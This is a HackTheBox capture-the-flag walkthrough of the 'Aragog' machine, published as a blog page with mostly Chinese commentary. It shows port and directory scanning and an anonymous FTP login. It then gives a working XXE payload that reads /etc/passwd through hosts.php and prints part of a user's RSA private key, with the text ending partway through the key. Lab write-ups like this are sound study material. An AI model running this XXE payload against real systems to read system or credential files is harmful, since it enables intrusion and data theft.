@@ -1,0 +1,688 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="World&#39;sEnd">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Recon:123456789101112131415161718192021Crazy:~&#x2F;HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.78[sudo] crazyinside 的密码：Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 202">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Walkthrough - Aragog">
+<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-Aragog.html">
+<meta property="og:site_name" content="Network Security Notes">
+<meta property="og:description" content="Recon:123456789101112131415161718192021Crazy:~&#x2F;HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.78[sudo] crazyinside 的密码：Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 202">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Aragog.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829100634427.png">
+<meta property="article:published_time" content="2023-08-13T22:39:09.069Z">
+<meta property="article:modified_time" content="2023-08-11T15:52:09.683Z">
+<meta property="article:author" content="World&#39;sEnd">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Aragog.png">
+  
+  
+  
+  <title>HTB Walkthrough - Aragog - Network Security Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB Walkthrough - Aragog"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-14 06:39" pubdate>
+          August 14, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          17k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          144 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB Walkthrough - Aragog</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Aragog.png" srcset="/img/loading.gif" lazyload alt="Aragog"></p>
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.78</span><br><span class="line">[sudo] crazyinside 的密码：</span><br><span class="line">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-29 01:50:39 GMT</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [131070 ports/host]</span><br><span class="line">Discovered open port 80/tcp on 10.10.10.78                                     </span><br><span class="line">Discovered open port 21/tcp on 10.10.10.78                                     </span><br><span class="line">Discovered open port 22/tcp on 10.10.10.78    </span><br><span class="line">Crazy:~$ sudo nmap -sC -sV 10.10.11.78 -p80,21,22 -Pn </span><br><span class="line">Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-29 09:53 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.78</span><br><span class="line">Host is up.</span><br><span class="line"></span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line">21/tcp filtered ftp</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp filtered http</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.56 seconds</span><br><span class="line">zsh: segmentation fault  sudo nmap -sC -sV 10.10.11.78 -p80,21,22 -Pn</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ feroxbuster -u http://10.10.10.78/ -e</span><br><span class="line"></span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.7.0</span><br><span class="line">───────────────────────────┬──────────────────────</span><br><span class="line"> 🎯  Target Url            │ http://10.10.10.78/</span><br><span class="line"> 🚀  Threads               │ 50</span><br><span class="line"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</span><br><span class="line"> 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]</span><br><span class="line"> 💥  Timeout (secs)        │ 7</span><br><span class="line"> 🦡  User-Agent            │ feroxbuster/2.7.0</span><br><span class="line"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span><br><span class="line"> 🔎  Extract Links         │ <span class="literal">true</span></span><br><span class="line"> 🏁  HTTP methods          │ [GET]</span><br><span class="line"> 🔃  Recursion Depth       │ 4</span><br><span class="line"> 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest</span><br><span class="line">───────────────────────────┴──────────────────────</span><br><span class="line"> 🏁  Press [ENTER] to use the Scan Management Menu™</span><br><span class="line">──────────────────────────────────────────────────</span><br><span class="line">200      GET       15l       74w     3338c http://10.10.10.78/icons/ubuntu-logo.png</span><br><span class="line">200      GET      375l      968w    11321c http://10.10.10.78/</span><br><span class="line">403      GET       11l       32w      292c http://10.10.10.78/icons/</span><br><span class="line">200      GET      166l      644w     5108c http://10.10.10.78/icons/README</span><br><span class="line">403      GET       11l       32w      299c http://10.10.10.78/server-status</span><br><span class="line">301      GET        9l       28w      316c http://10.10.10.78/icons/small =&gt; http://10.10.10.78/icons/small/</span><br></pre></td></tr></table></figure>
+
+<p>FTP里有</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; user</span><br><span class="line">(username) anonymous</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; <span class="built_in">ls</span></span><br><span class="line">229 Entering Extended Passive Mode (|||42091|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; get test.txt</span><br><span class="line"><span class="built_in">local</span>: test.txt remote: test.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||49152|)</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> test.txt (86 bytes).</span><br><span class="line">100% |****************************************************************************************************|    86        1.94 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">86 bytes received <span class="keyword">in</span> 00:00 (0.61 KiB/s)</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ <span class="built_in">cat</span> test.txt                   </span><br><span class="line">&lt;details&gt;</span><br><span class="line">    &lt;subnet_mask&gt;255.255.255.192&lt;/subnet_mask&gt;</span><br><span class="line">    &lt;<span class="built_in">test</span>&gt;&lt;/test&gt;</span><br><span class="line">&lt;/details&gt;</span><br></pre></td></tr></table></figure>
+
+<p>共享与FTP似乎是没有关联的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ gobuster <span class="built_in">dir</span> -u http://10.10.10.78 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 100</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://10.10.10.78</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 100</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              txt,php,html</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2022/08/29 10:03:55 Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 11321]</span><br><span class="line">/hosts.php            (Status: 200) [Size: 46]   </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829100634427.png" srcset="/img/loading.gif" lazyload alt="image-20220829100634427"></p>
+<h2 id="User-txt"><a href="#User-txt" class="headerlink" title="User.txt"></a>User.txt</h2><p>计算可能主机的。抓个包：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/hosts.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>10.10.10.78</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
+
+<p>XML。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl -X POST -d @test.txt http://10.10.10.78/hosts.php</span><br><span class="line"></span><br><span class="line">There are 62 possible hosts <span class="keyword">for</span> 255.255.255.192</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ <span class="built_in">cat</span> test.xml                                          </span><br><span class="line">&lt;!DOCTYPE foo[</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///etc/lsb-release&quot;</span>&gt; ]&gt;</span><br><span class="line">&lt;details&gt;</span><br><span class="line">    &lt;subnet_mask&gt;&amp;xxe;&lt;/subnet_mask&gt;</span><br><span class="line">    &lt;<span class="built_in">test</span>&gt;&lt;/test&gt;</span><br><span class="line">&lt;/details&gt;</span><br><span class="line"></span><br><span class="line">Crazy:~/HackTheBox$ curl -X POST -d @test.xml http://10.10.10.78/hosts.php</span><br><span class="line"></span><br><span class="line">There are 4294967294 possible hosts <span class="keyword">for</span> DISTRIB_ID=Ubuntu</span><br><span class="line">DISTRIB_RELEASE=16.04</span><br><span class="line">DISTRIB_CODENAME=xenial</span><br><span class="line">DISTRIB_DESCRIPTION=<span class="string">&quot;Ubuntu 16.04.3 LTS&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl -X POST -d @test.xml http://10.10.10.78/hosts.php</span><br><span class="line"></span><br><span class="line">There are 4294967294 possible hosts <span class="keyword">for</span> root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">syslog:x:104:108::/home/syslog:/bin/false</span><br><span class="line">_apt:x:105:65534::/nonexistent:/bin/false</span><br><span class="line">messagebus:x:106:110::/var/run/dbus:/bin/false</span><br><span class="line">uuidd:x:107:111::/run/uuidd:/bin/false</span><br><span class="line">lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false</span><br><span class="line">whoopsie:x:109:117::/nonexistent:/bin/false</span><br><span class="line">avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false</span><br><span class="line">avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false</span><br><span class="line">dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false</span><br><span class="line">colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false</span><br><span class="line">speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false</span><br><span class="line">hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false</span><br><span class="line">kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false</span><br><span class="line">pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false</span><br><span class="line">rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false</span><br><span class="line">saned:x:119:127::/var/lib/saned:/bin/false</span><br><span class="line">usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false</span><br><span class="line">florian:x:1000:1000:florian,,,:/home/florian:/bin/bash</span><br><span class="line">cliff:x:1001:1001::/home/cliff:/bin/bash</span><br><span class="line">mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">ftp:x:123:130:ftp daemon,,,:/srv/ftp:/bin/false</span><br></pre></td></tr></table></figure>
+
+<p>可以读取到florian用户的ssh秘钥：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl -X POST -d @test.xml http://10.10.10.78/hosts.php</span><br><span class="line"></span><br><span class="line">There are 4294967294 possible hosts <span class="keyword">for</span> </span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpAIBAAKCAQEA50DQtmOP78gLZkBjJ/JcC5gmsI21+tPH3wjvLAHaFMmf7j4d</span><br><span class="line">+YQEMbEg+yjj6/ybxJAsF8l2kUhfk56LdpmC3mf/sO4romp9ONkl9R4cu5OB5ef8</span><br><span class="line">lAjOg67dxWIo77STqYZrWUVnQ4n8dKG4Tb/z67+gT0R9lD9c0PhZwRsFQj8aKFFn</span><br><span class="line">1R1B8n9/e1PB0AJ81PPxCc3RpVJdwbq8BLZrVXKNsg+SBUdbBZc3rBC81Kle2CB+</span><br><span class="line">Ix89HQ3deBCL3EpRXoYVQZ4EuCsDo7UlC8YSoEBgVx4IgQCWx34tXCme5cJa/UJd</span><br><span class="line">d4Lkst4w4sptYMHzzshmUDrkrDJDq6olL4FyKwIDAQABAoIBAAxwMwmsX0CRbPOK</span><br><span class="line">AQtUANlqzKHwbVpZa8W2UE74poc5tQ12b9xM2oDluxVnRKMbyjEPZB+/aU41K1bg</span><br><span class="line">TzYI2b4mr90PYm9w9N1K6Ly/auI38+Ouz6oSszDoBeuo9PS3rL2QilOZ5Qz/7gFD</span><br><span class="line">9YrRCUij3PaGg46mvdJLmWBGmMjQS+ZJ7w1ouqsIANypMay2t45v2Ak+SDhl/SDb</span><br><span class="line">/oBJFfnOpXNtQfJZZknOGY3SlCWHTgMCyYJtjMCW2Sh2wxiQSBC8C3p1iKWgyaSV</span><br><span class="line">0qH/3gt7RXd1F3vdvACeuMmjjjARd+LNfsaiu714meDiwif27Knqun4NQ+2x8JA1</span><br><span class="line">sWmBdcECgYEA836Z4ocK0GM7akW09wC7PkvjAweILyq4izvYZg+88Rei0k411lTV</span><br><span class="line">Uahyd7ojN6McSd6foNeRjmqckrKOmCq2hVOXYIWCGxRIIj5WflyynPGhDdMCQtIH</span><br><span class="line">zCr9VrMFc7WCCD+C7nw2YzTrvYByns/Cv+uHRBLe3S4k0KNiUCWmuYsCgYEA8yFE</span><br><span class="line">rV5bD+XI/iOtlUrbKPRyuFVUtPLZ6UPuunLKG4wgsGsiVITYiRhEiHdBjHK8GmYE</span><br><span class="line">tkfFzslrt+cjbWNVcJuXeA6b8Pala7fDp8lBymi8KGnsWlkdQh/5Ew7KRcvWS5q3</span><br><span class="line">HML6ac06Ur2V0ylt1hGh/A4r4YNKgejQ1CcO/eECgYEAk02wjKEDgsO1avoWmyL/</span><br><span class="line">I5XHFMsWsOoYUGr44+17cSLKZo3X9fzGPCs6bIHX0k3DzFB4o1YmAVEvvXN13kpg</span><br><span class="line">ttG2DzdVWUpwxP6PVsx/ZYCr3PAdOw1SmEodjriogLJ6osDBVcMhJ+0Y/EBblwW7</span><br><span class="line">HF3BLAZ6erXyoaFl1XShozcCgYBuS+JfEBYZkTHscP0XZD0mSDce/r8N07odw46y</span><br><span class="line">kM61To2p2wBY/WdKUnMMwaU/9PD2vN9YXhkTpXazmC0PO+gPzNYbRe1ilFIZGuWs</span><br><span class="line">4XVyQK9TWjI6DoFidSTGi4ghv8Y4yDhX2PBHPS4/SPiGMh485gTpVvh7Ntd/NcI+</span><br><span 